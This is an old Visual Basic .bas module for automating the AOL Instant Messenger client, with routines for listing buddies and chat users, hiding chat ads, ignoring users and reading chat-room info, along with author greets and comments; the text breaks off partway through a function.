Attribute VB_Name = "Awgf2ooo"
'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
'X                                                                     X
'X           A ©©©©       ©©©©    ©©©©©©©©©    ©©©©©©©  v.2ooo         X
'X            ©OOOO©     ©OOOO© ©OOOOOOOOOO©  ©OOOOOOO©                X
'X             ©OO©  ©©©  ©OO©  ©OO©©©©©©OO©  ©OO©©©©©                 X
'X             ©OO© ©OOO© ©OO©  ©OO©     ©©   ©OO©                     X
'X             ©OO© ©OOO© ©OO©  ©OO© ©OOOOO©  ©OOOOOO©                 X
'X             ©OO©©©O O©©©OO©  ©OO©    ©OO©  ©OO©                     X
'X             ©OOOOOO OOOOOO©  ©OOOOOOOOOO©  ©OO©                     X
'X              ©©©©©© ©©©©©     ©©©©©©©©©©    ©©                      X
'X                The New Wave Is Here Are You Ready?                  X
'X                                                     By:wgf & martyr X
'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
'.·´`·.·×·•(Awgf2ooo.bas)
'.·´`·.·×·•(A wgf production)
'.·´`·.·×·•(AMade with Vb5.o)
'.·´`·.·×·•(AFor Vb5/6)
'.·´`·.·×·•(AThe most complete Aol4/5/Aim module ever!)
'.·´`·.·×·•(A real 32bit .Bas)
'.·´`·.·×·•(AThis will be my last ever .bas release most likley, unless Aol5.o has drastic changes(or not, >o)
'.·´`·.·×·•(ASorry about my last two mostly copied code .bas's)
'.·´`·.·×·•(Any Q's,Comments or bugs? Send to realwgf@hotmail.com)
'.·´`·.·×·•(AVist my GREAT website at http://i.am/wgf)
'.·´`·.·×·•(Allways rember "Do The Dew")
'.·´`·.·×·•(ACya you all in the 2ooo's)
'.·´`·.·×·•(A-wgf-)

'.·´`·.·×·•(Awgf's Greets)
'.·´`·.·×·•(AGreets To-)
'.·´`·.·×·•(Naïve)
'.·´`·.·×·•(Amartyr)
'.·´`·.·×·•(Adel)
'.·´`·.·×·•(ARuStY)
'.·´`·.·×·•(A007)
'.·´`·.·×·•(Acmos a.k.a.dexter)
'.·´`·.·×·•(AMike)
'.·´`·.·×·•(Askam)
'.·´`·.·×·•(Asyk0)
'.·´`·.·×·•(Astrife)
'.·´`·.·×·•(ACr)
'.·´`·.·×·•(AKnK for putting up my first couple of bas even though they sucked, heh. Made me relize that I need to get it together and write my own code)
'.·´`·.·×·•(And last but not least my old pal-)
'.·´`·.·×·•(AWarren)
'.·´`·.·×·•(Also any one else I forgot to mention >o)
'.·´`·.·×·•(AIf you know these people and dont like them to bad. Most fo them are people who I helped a few times here and there and if you think there jerks or idiots alls I can say is there not around me >o)
'.·´`·.·×·•(And last but not least, you for d/ln' my module =)


'.·´`·.·×·•(A martyr's Greets)

'.·´`·.·×·•(A medusa
'.·´`·.·×·•(A viper
'.·´`·.·×·•(A i0dine
'.·´`·.·×·•(A magnet
'.·´`·.·×·•(A wgf
'.·´`·.·×·•(A anyone who downloaded this module

'.·´`·.·×·•(A i did all the aim things for this module, except aim_close
'.·´`·.·×·•(A i did not copy any of the code, if you need proof
'.·´`·.·×·•(A then you suck, but i have all of aim's windows
'.·´`·.·×·•(A in a txt file.
'.·´`·.·×·•(A i prefer naming FindWindow-FindParent and FindWindowEx-FindChild
'.·´`·.·×·•(A and rename a lot of the other decs, just kuz my names help me more
'.·´`·.·×·•(A but i did not write the declarations
'.·´`·.·×·•(A any questions, ideas, or just wanna bitch then e-mail me: kaosdemon2@hotmail.com
'.·´`·.·×·•(A i don't have a site.......


'this is what martyr added to this module
'these enums are nice for people with vb5+
Public Enum Font
    fntBold
    fntItalic
    fntStrikeThru
    fntUnderLine
End Enum

Public Enum Chat
    cPublic
    cPrivate
End Enum

Public Enum ChatPos
    cpLeft
    cpMid
    cpRight
End Enum

Public Enum AIMWnds
    awMain
    awChat
    awIM
End Enum

Public Enum MainWnds
    mwAdTop
    mwAdBottom
    mwButtonIM
    mwButtonChatInvite
    mwButtonFind
    mwTowers
    mwMyNews
    mwBuddies
    mwGo
    mwTxt
    mwTab
    mwUseful
    mwAll
End Enum

Public Enum Vis
    vShow
    vHide
End Enum

Public Enum ChatAds
    cwLeft
    cwMid
    cwRight
    cwAll
End Enum

Public Enum RateAndStamps
    tsChat
    tsIM
    tsBoth
End Enum

Public Enum ChatButton
    cbLess
    cbMore
End Enum

Public Const fntB = "<b>"
Public Const fntBd = "</b>"
Public Const fntI = "<i>"
Public Const fntId = "</i>"
Public Const fntS = "<s>"
Public Const fntSd = "</s>"
Public Const fntU = "<u>"
Public Const fntUd = "</u>"
'end of stuff that martyr added




















Option Explicit 'No undefined varibels. Varified by: Option Explicit, DO NOT Edit any of the below codes unless you know what your doing :) result in doing so could end up in fatal error and you would have to download it all over agian =)

Public Declare Function BringWindowToTop Lib "user32" (ByVal hWnd As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (destination As Any, Source As Any, ByVal Length As Long)
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Public Declare Function GetMenu Lib "user32" (ByVal hWnd As Long) As Long
Public Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Public Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Public Declare Function GetParent Lib "user32" (ByVal hWnd As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFilename As String) As Long
Public Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindow Lib "user32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long
Public Declare Function GetSystemMenu Lib "user32" (ByVal hWnd As Integer, ByVal bRevert As Integer) As Integer
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Public Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hWnd As Long, lpdwProcessId As Long) As Long
Public Declare Function IsWindowVisible Lib "user32" (ByVal hWnd As Long) As Long
Public Declare Function IsIconic Lib "user32" (ByVal hWnd As Long) As Long
Public Declare Function IsZoomed Lib "user32" (ByVal hWnd As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function MciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function SendMessageLong& Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function SendMessageByString Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal y As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Public Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Public Declare Function ShowWindow Lib "user32" (ByVal hWnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function SndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Public Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Public Declare Function ReleaseCapture Lib "user32" () As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFilename As String) As Long
Public Declare Function EnableWindow Lib "user32" (ByVal hWnd As Long, ByVal cmd As Long) As Long
Public Declare Function Shell_NotifyIcon Lib "Shell32" Alias "Shell_NotifyIconA" (ByVal dwMessage As Long, pnid As NOTIFYICONDATA) As Boolean
Public Declare Function FlashWindow Lib "user32" (ByVal hWnd As Long, ByVal bInvert As Long) As Long
Public Declare Function GetWindowRect Lib "user32" (ByVal hWnd As Long, lpRect As RECT) As Long
Public Declare Function GetDC Lib "user32" (ByVal hWnd As Long) As Long
Public Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
Public Declare Function Rectangle Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal x2 As Long, ByVal Y2 As Long) As Long
Public Declare Function ReleaseDC Lib "user32" (ByVal hWnd As Long, ByVal hdc As Long) As Long
Public Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Public Declare Function SendMessageByNum& Lib "user32" Alias "SendMessageA" (ByVal hWnd&, ByVal wMsg&, ByVal wParam&, ByVal lParam&)

Public Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)

Public Const BM_GETCHECK = &HF0
Public Const BM_SETCHECK = &HF1

Public Const PROCESS_READ = &H10
Public Const RIGHTS_REQUIRED = &HF0000
Public Const Op_Flags = PROCESS_READ Or RIGHTS_REQUIRED

Public Const HWND_NOTOPMOST = -2
Public Const HWND_TOPMOST = -1

Public Const LB_ADDSTRING& = &H180
Public Const LB_DELETESTRING = &H182
Public Const LB_FINDSTRINGEXACT& = &H1A2
Public Const LB_GETCOUNT& = &H18B
Public Const LB_GETCURSEL& = &H188
Public Const LB_GETITEMDATA = &H199
Public Const LB_GETTEXT = &H189
Public Const LB_GETTEXTLEN& = &H18A
Public Const LB_INSERTSTRING = &H181
Public Const LB_RESETCONTENT& = &H184
Public Const LB_SETCURSEL = &H186
Public Const LB_SETSEL = &H185

Public Const CB_ADDSTRING& = &H143
Public Const CB_DELETESTRING& = &H144
Public Const CB_FINDSTRINGEXACT& = &H158
Public Const CB_GETCOUNT& = &H146
Public Const CB_GETITEMDATA = &H150
Public Const CB_GETLBTEXT& = &H148
Public Const CB_RESETCONTENT& = &H14B
Public Const CB_SETCURSEL& = &H14E

Global Const SND_SYNC = &H0
Global Const SND_ASYNC = &H1
Global Const SND_NODEFAULT = &H2
Global Const SND_LOOP = &H8
Global Const SND_NOSTOP = &H10

Public Const Sys_Add = &H0
Public Const Sys_Delete = &H2
Public Const Sys_Message = &H1
Public Const Sys_Icon = &H2
Public Const Sys_Tip = &H4

Public Const SND_FLAG = SND_ASYNC Or SND_NODEFAULT
Public Const Snd_Flag2 = SND_ASYNC Or SND_LOOP

Public Const SW_Hide = 0
Public Const SW_MAXIMIZE& = 3
Public Const SW_MINIMIZE& = 6
Public Const SW_RESTORE& = 9
Public Const SW_SHOW = 5

Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1

Public Const VK_DOWN = &H28
Public Const VK_LEFT = &H25
Public Const VK_MENU = &H12
Public Const VK_RETURN = &HD
Public Const VK_RIGHT = &H27
Public Const VK_SHIFT = &H10
Public Const VK_SPACE = &H20
Public Const VK_UP = &H26

Public Const WM_CHAR = &H102
Public Const WM_CLOSE = &H10
Public Const WM_CLEAR = &H303
Public Const WM_MOUSEMOVE = &H200
Public Const WM_COMMAND = &H111
Public Const WM_GETTEXT = &HD
Public Const WM_GETTEXTLENGTH = &HE
Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101
Public Const WM_LBUTTONDBLCLK = &H203
Public Const WM_LBUTTONDOWN = &H201
Public Const WM_LBUTTONUP = &H202
Public Const WM_MOVE = &HF012
Public Const WM_SETTEXT = &HC
Public Const WM_SYSCOMMAND = &H112

Public Const MF_BYPOSITION = &H400&

Public Const EM_GETLINECOUNT& = &HBA
Public Const ENTER_KEY = 13
Public Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE

Public Type POINTAPI
        X As Long
        y As Long
End Type

Public Enum MAILTYPE
        mailFLASH
        mailNEW
        mailOLD
        mailSENT
End Enum

Public systray As NOTIFYICONDATA

Public Type NOTIFYICONDATA
        cbSize As Long
        hWnd As Long
        uId As Long
        uFlags As Long
        ucallbackMessage As Long
        hIcon As Long
        szTip As String * 64
End Type

Type RECT
        Left As Long
        Top As Long
        Right As Long
        Bottom As Long
    End Type

Public Enum OnScreen
    scon
    scoff
End Enum

Public Sub AIM_AddBuddiesToList(lst As listbox, Optional AddGroups As Boolean)

'pretty simple sub that adds your buddy
'list to a list box
'*note* i'm using wgf's method i can't seem
'to get my sub to do this :/

Dim AIM As Long
Dim AIM_Tab As Long
Dim Tab_List As Long
Dim Process As Long
Dim ListHoldItem As Long
Dim Name As String
Dim ListHoldName As Long
Dim BytesRead As Long
Dim ProcessThread As Long
Dim Count As Long

AIM& = FindWindow&("_oscar_buddylistwin", vbNullString)
AIM_Tab& = FindWindowEx&(AIM&, 0&, "_oscar_tabgroup", vbNullString)
Tab_List& = FindWindowEx&(AIM_Tab&, 0&, "_oscar_tree", vbNullString)

Call GetWindowThreadProcessId(Tab_List&, Process&)
ProcessThread& = OpenProcess(Op_Flags, False, Process&)

If ProcessThread& <> 0& Then
    For Count& = 0 To SendMessage(Tab_List&, LB_GETCOUNT&, 0&, 0&) - 1
        Name$ = String(4, vbNullChar)
        ListHoldItem& = SendMessage(Tab_List&, LB_GETITEMDATA, ByVal CLng(Count&), 0&)
        ListHoldItem& = ListHoldItem& + 24
            Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, 4, BytesRead&)
            Call RtlMoveMemory(ListHoldItem&, ByVal Name$, 4)
        ListHoldItem& = ListHoldItem& + 6
        Name$ = String(16, vbNullChar)
            Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, Len(Name$), BytesRead&)
        Name$ = Left(Name$, InStr(Name$, vbNullChar) - 1)
            If AddGroups = True Then
                If InStr(Name$, "(") = 0& And InStr(Name$, ")") = 0& Then lst.AddItem Name$
            Else
                lst.AddItem Name$
            End If
    Next Count&
        Call CloseHandle(ProcessThread&)
End If

End Sub

Public Sub AIM_AddChatToList(lst As listbox, Optional AddUser As Boolean = False)

'this sub will automatically skip the users sn
'in the chat room, you have to make the AddUser
'equal true
'*note* i used wgf's method for this....

Dim Chat As Long
Dim Chat_List As Long
Dim Process As Long
Dim ListHoldItem As Long
Dim Name As String
Dim ListHoldName As Long
Dim BytesRead As Long
Dim ProcessThread As Long
Dim Count As Long

Chat& = FindWindow&("aim_chatwnd", vbNullString)
Chat_List& = FindWindowEx&(Chat&, 0&, "_oscar_tree", vbNullString)

Call GetWindowThreadProcessId(Chat_List&, Process&)
ProcessThread& = OpenProcess(Op_Flags, False, Process&)

If ProcessThread& <> 0& Then
    For Count& = 0 To SendMessage(Chat_List&, LB_GETCOUNT&, 0&, 0&) - 1
        Name$ = String(4, vbNullChar)
        ListHoldItem& = SendMessage(Chat_List&, LB_GETITEMDATA, ByVal CLng(Count&), 0&)
        ListHoldItem& = ListHoldItem& + 24
            Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, 4, BytesRead&)
            Call RtlMoveMemory(ListHoldItem&, ByVal Name$, 4)
        ListHoldItem& = ListHoldItem& + 6
        Name$ = String(16, vbNullChar)
            Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, Len(Name$), BytesRead&)
        Name$ = Left(Name$, InStr(Name$, vbNullChar) - 1)
            If AddUser = True Then
                If Not LCase(Name$) Like LCase(AIM_UserSn) Then lst.AddItem Name$
            Else
                lst.AddItem Name$
            End If
    Next Count&
        Call CloseHandle(ProcessThread&)
End If

End Sub

Public Sub AIM_ChatAds(Ad As ChatAds, Seen As Vis, Optional All As Boolean)

'this will hide those annoying ads in the chat room
'its an okay sub

Dim Chat As Long
Dim Chat_Txt As Long
Dim Chat_Txt2 As Long
Dim Chat_AdLeft As Long
Dim Chat_AdMid As Long
Dim Chat_AdRight As Long
Dim ShowIt As Long
Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& = 0& Then Exit Sub
    Select Case Seen
        Case vHide
            ShowIt = 0
        Case vShow
            ShowIt = 5
    End Select
    Chat_Txt& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
    Chat_Txt2& = FindWindowEx&(Chat&, Chat_Txt&, "wndate32class", vbNullString)
    Chat_AdLeft& = FindWindowEx&(Chat&, Chat_Txt2&, "wndate32class", vbNullString)
    Chat_AdMid& = FindWindowEx&(Chat&, Chat_AdLeft&, "wndate32class", vbNullString)
    Chat_AdRight& = FindWindowEx&(Chat&, Chat_AdMid&, "wndate32class", vbNullString)
    Select Case Ad
        Case cwLeft
            ShowWindow Chat_AdLeft&, ShowIt
        Case cwMid
            ShowWindow Chat_AdMid&, ShowIt
        Case cwRight
            ShowWindow Chat_AdRight&, ShowIt
        Case cwAll
            ShowWindow Chat_AdLeft&, ShowIt
            ShowWindow Chat_AdRight&, ShowIt
            ShowWindow Chat_AdMid&, ShowIt
    End Select
    
    If All = True Then
        Do
            Chat& = FindWindowEx&(0&, Chat&, "aim_chatwnd", vbNullString)
            Chat_Txt& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
            Chat_Txt2& = FindWindowEx&(Chat&, Chat_Txt&, "wndate32class", vbNullString)
            Chat_AdLeft& = FindWindowEx&(Chat&, Chat_Txt2&, "wndate32class", vbNullString)
            Chat_AdMid& = FindWindowEx&(Chat&, Chat_AdLeft&, "wndate32class", vbNullString)
            Chat_AdRight& = FindWindowEx&(Chat&, Chat_AdMid&, "wndate32class", vbNullString)
            Select Case Ad
                Case cwLeft
                    ShowWindow Chat_AdLeft&, ShowIt
                Case cwMid
                    ShowWindow Chat_AdMid&, ShowIt
                Case cwRight
                    ShowWindow Chat_AdRight&, ShowIt
                Case cwAll
                    ShowWindow Chat_AdLeft&, ShowIt
                    ShowWindow Chat_AdRight&, ShowIt
                    ShowWindow Chat_AdMid&, ShowIt
                End Select
        Loop Until Chat& = 0&
    End If


End Sub


Public Sub AIM_ChatIgnore(Lamer As String, Optional FullSn As Boolean)

'this is like the AIM_AddBuddyList
'i did some modifications to sirs sub
'so the coding is not all mine

Dim Chat As Long
Dim Chat_List As Long
Dim Chat_IM As Long
Dim Chat_Ignore As Long
Dim LstCount As Long
Dim Count As Long
Dim Find As String
Lamer$ = ReplaceString(Lamer$, " ", "")

Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& = 0& Then Exit Sub
        Chat_List& = FindWindowEx&(Chat&, 0&, "_oscar_tree", vbNullString)
            LstCount& = SendMessage(Chat_List&, 0&, &H18B, 0&)
                For Count& = 0 To LstCount& - 1
                    SendMessage Chat_List&, &H186, Count&, Find$
                    Find$ = ReplaceString(Find$, " ", "")
                    If InStr(Find$, Chr(0)) <> 0& Then Find$ = Trim(Mid(Find$, 1, InStr(1, Find$, Chr(0)) - 1))
                    If InStr(Find$, Chr(0)) = 0& Then Find$ = Find$
                    'sirs method for removing null chrs
                    If FullSn = False Then
                        If InStr(LCase(Find$), LCase(Lamer$)) <> 0& Then Exit For
                    End If
                    If LCase(Find$) Like LCase(Lamer$) Then Exit For
                Next Count&
                    Chat_IM& = FindWindowEx&(Chat&, 0&, "_oscar_iconbtn", vbNullString)
                    Chat_Ignore& = FindWindowEx&(Chat&, Chat_IM&, "_oscar_iconbtn", vbNullString)
                    PostMessage Chat_Ignore&, &H201, 0&, 0&
                    PostMessage Chat_Ignore&, &H202, 0&, 0&
End Sub
Public Function AIM_About()


'*new*
'i went through and fixed the bugs i knew
'about and removed a sub just kuz i wanted
'to. i coulda fixed it, but i went in the
'aim room, vb, and after only a couple
'seconds i had to [x] nearly the whole
'damn room, so many fucking lamers on aim
'and aol. i'm sick of this shit, i love
'programming for aol and aim, but i'm not
'sure if i'm going to release anything
'anymore :/
'i finished my second chat scan and so far
'i have found no bugs ;c) but i got to test
'it some more... i don't know when/if
'i'll release it....
'sorry people but ao-lamers have really
'gotten on my nerves....


'*important*
'at the bottom of some subs/functions
'i'll explain what it just did
'(only if the sub is complicating)

'its been a long time since someone
'has done so much for aim

'okay these words are from me (martyr)
'i wanted to give the user as much control as possible
'so my subs may be too advanced for some people
'if this is the case i strongly suggest digital flame's bas.
'this made less aim subs/functions to look at, yet they can do
'what most aim modules can do, and a little more ;)
'rather than list all the different aim windows
'to hide and show
'they are all available in one sub
'my aim functions will be very hard unless you
'have vb5 or higher because, i use Enums to list the options
'thanx go's to gpx for that idea
'and thanx to izekial, his bas showed me how to count windows
'without closing any.

'i'm planning on releasing a dll or ocx just for aim coming up soon
'also i'm planning on releasing an aol one, but i'm just not sure

'so, if you like my method of coding then mail me with your support
'and even if you don't support me, mail me with problems

'in the future i'm hoping to make something with i0dine
'we love to block aim lamers, so maybe we'll make a tool
'for that soon....

'*note*
'any programmer who bitches about code stealing should write a dll
'or an ocx
'so stop your bitching.


'known aim links:
'*note* these are only the ones i know

'+'s are read as spaces to aim links
'&'s are read as and's to aim links

'private room:
'aim:gochat?roomname=Room+name

'public room:
'aim:gochat?roomname=Room+name&exchange=5

'open im:
'aim:goim?screenname=SomeLamer&message=i+know+who+you+are

'open mail:
'mailto:someone@somewhere.net

'get file:
'aim:getfile?screenname=SomeLamer

'open icon wizard:
'aim:buddyicon?

'add buddy to list:
'aim:addbuddy?screename=SomeLamer



End Function

Public Sub AIM_ChatClose(Optional All As Boolean)

'close topmost chat or all of them

Dim Chat As Long

Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& <> 0& Then
        WinClose Chat&
        If All Then
            Do
                Chat& = FindWindow&("aim_chatwnd", vbNullString)
                If Chat& <> 0& Then
                    WinClose Chat&
                Else
                    Exit Sub
                End If
            Loop Until Chat& = 0&
        Else
            Exit Sub
        End If
    End If

End Sub


Public Function AIM_ChatCreation() As String
'this will get the date and time the chat was created
Dim Chat As Long
Dim ChatInfo As Long
Dim Static1 As Long
Dim Static2 As Long
Dim Static3 As Long
Dim Static4 As Long
Dim Static5 As Long
Dim Static6 As Long
Dim Static7 As Long
Dim Static8 As Long
Dim Static9 As Long
Dim Static10 As Long
Dim Static11 As Long
Dim Static12 As Long

Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& <> 0& Then
        RunMenuByString Chat&, "&Chat Room Info..."
        Do
            ChatInfo& = FindWindowEx&(Chat&, 0&, "aim_ctlgroupwnd", vbNullString)
        Loop Until ChatInfo& <> 0&
        
        Static1& = FindWindowEx&(ChatInfo&, 0&, "_oscar_static", vbNullString)
        Static2& = FindWindowEx&(ChatInfo&, Static1&, "_oscar_static", vbNullString)
        Static3& = FindWindowEx&(ChatInfo&, Static2&, "_oscar_static", vbNullString)
        Static4& = FindWindowEx&(ChatInfo&, Static3&, "_oscar_static", vbNullString)
        Static5& = FindWindowEx&(ChatInfo&, Static4&, "_oscar_static", vbNullString)
        Static6& = FindWindowEx&(ChatInfo&, Static5&, "_oscar_static", vbNullString)
        Static7& = FindWindowEx&(ChatInfo&, Static6&, "_oscar_static", vbNullString)
        Static8& = FindWindowEx&(ChatInfo&, Static7&, "_oscar_static", vbNullString)
        Static9& = FindWindowEx&(ChatInfo&, Static8&, "_oscar_static", vbNullString)
        Static10& = FindWindowEx&(ChatInfo&, Static9&, "_oscar_static", vbNullString)
        Static11& = FindWindowEx&(ChatInfo&, Static10&, "_oscar_static", vbNullString)
        Static12& = FindWindowEx&(ChatInfo&, Static11&, "_oscar_static", vbNullString)
        AIM_ChatCreation$ = GetText(Static12&)
        WinClose ChatInfo
    Else
        AIM_ChatCreation$ = ""
    End If
    
    
End Function

Public Function AIM_ChatInstance() As String
'this sub is really really worthless
'all it does is get the chats instance
'private chats have an instance of 4
'public chats chat an instance of 5
Dim Chat As Long
Dim ChatInfo As Long
Dim Static1 As Long
Dim Static2 As Long
Dim Static3 As Long
Dim Static4 As Long
Dim Static5 As Long
Dim Static6 As Long

Chat& = FindWindow&("aim_chatwnd", vbNullString)
    
    If Chat& <> 0& Then
        
        RunMenuByString Chat&, "&Chat Room Info..."
        
        Do
            ChatInfo& = FindWindow&("aim_ctlgroupwnd", vbNullString)
        Loop Until ChatInfo& <> 0&
        
        Static1& = FindWindowEx&(ChatInfo&, 0&, "_oscar_static", vbNullString)
        Static2& = FindWindowEx&(ChatInfo&, Static1&, "_oscar_static", vbNullString)
        Static3& = FindWindowEx&(ChatInfo&, Static2&, "_oscar_static", vbNullString)
        Static4& = FindWindowEx&(ChatInfo&, Static3&, "_oscar_static", vbNullString)
        Static5& = FindWindowEx&(ChatInfo&, Static4&, "_oscar_static", vbNullString)
        Static6& = FindWindowEx&(ChatInfo&, Static5&, "_oscar_static", vbNullString)
        AIM_ChatInstance$ = GetText(Static6&)
        WinClose ChatInfo
    Else
        AIM_ChatInstance$ = ""
    End If

End Function

Public Function AIM_ChatLanguage() As String
'okay this is lame, but wgf needed all i could do
'so lol here is a way to get the chats language
Dim Chat As Long
Dim ChatInfo As Long
Dim Static1 As Long
Dim Static2 As Long
Dim Static3 As Long
Dim Static4 As Long
Dim Static5 As Long
Dim Static6 As Long
Dim Static7 As Long
Dim Static8 As Long

Chat& = FindWindow&("aim_chatwnd", vbNullString)
    
    If Chat& <> 0& Then
        
        RunMenuByString Chat&, "&Chat Room Info..."
        
        Do
            ChatInfo& = FindWindow&("aim_ctlgroupwnd", vbNullString)
        Loop Until ChatInfo& <> 0&
        
        Static1& = FindWindowEx&(ChatInfo&, 0&, "_oscar_static", vbNullString)
        Static2& = FindWindowEx&(ChatInfo&, Static1&, "_oscar_static", vbNullString)
        Static3& = FindWindowEx&(ChatInfo&, Static2&, "_oscar_static", vbNullString)
        Static4& = FindWindowEx&(ChatInfo&, Static3&, "_oscar_static", vbNullString)
        Static5& = FindWindowEx&(ChatInfo&, Static4&, "_oscar_static", vbNullString)
        Static6& = FindWindowEx&(ChatInfo&, Static5&, "_oscar_static", vbNullString)
        Static7& = FindWindowEx&(ChatInfo&, Static6&, "_oscar_static", vbNullString)
        Static8& = FindWindowEx&(ChatInfo&, Static7&, "_oscar_static", vbNullString)
        AIM_ChatLanguage$ = GetText(Static8&)
        WinClose ChatInfo
    Else
        AIM_ChatLanguage$ = ""
    End If

End Function
Public Sub AIM_ChatLessMore(LessMore As ChatButton, Optional All As Boolean)

'this will show or hide the quick chat links
'lame

Dim Chat As Long
Dim Chat_Button As Long
Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& = 0& Then Exit Sub
    Select Case LessMore
        Case cbLess
            Chat_Button& = FindWindowEx&(Chat&, 0&, "button", "&Less")
        Case cbMore
            Chat_Button& = FindWindowEx&(Chat&, 0&, "button", "&More")
    End Select
    PostMessage Chat_Button&, &H201, 0&, 0&
    PostMessage Chat_Button&, &H202, 0&, 0&
    
    If All = True Then
        Do
        Chat& = FindWindowEx&(0&, Chat&, "aim_chatwnd", vbNullString)
            Select Case LessMore
                Case cbLess
                    Chat_Button& = FindWindowEx&(Chat&, 0&, "button", "&Less")
                Case cbMore
                    Chat_Button& = FindWindowEx&(Chat&, 0&, "button", "&More")
            End Select
            PostMessage Chat_Button&, &H201, 0&, 0&
            PostMessage Chat_Button&, &H202, 0&, 0&
        Loop Until Chat& = 0&
    End If
    
End Sub

Public Function AIM_ChatMaxMsgLen() As String
'this sub is kinda kewl i guess.....
'for peeps wanting to make a really lame macro killer

Dim Chat As Long
Dim ChatInfo As Long
Dim Static1 As Long
Dim Static2 As Long
Dim Static3 As Long
Dim Static4 As Long
Dim Static5 As Long
Dim Static6 As Long
Dim Static7 As Long
Dim Static8 As Long
Dim Static9 As Long
Dim Static10 As Long

Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& <> 0& Then
        RunMenuByString Chat&, "&Chat Room Info..."
        Do
            ChatInfo& = FindWindowEx&(Chat&, 0&, "aim_ctlgroupwnd", vbNullString)
        Loop Until ChatInfo& <> 0&
        
        Static1& = FindWindowEx&(ChatInfo&, 0&, "_oscar_static", vbNullString)
        Static2& = FindWindowEx&(ChatInfo&, Static1&, "_oscar_static", vbNullString)
        Static3& = FindWindowEx&(ChatInfo&, Static2&, "_oscar_static", vbNullString)
        Static4& = FindWindowEx&(ChatInfo&, Static3&, "_oscar_static", vbNullString)
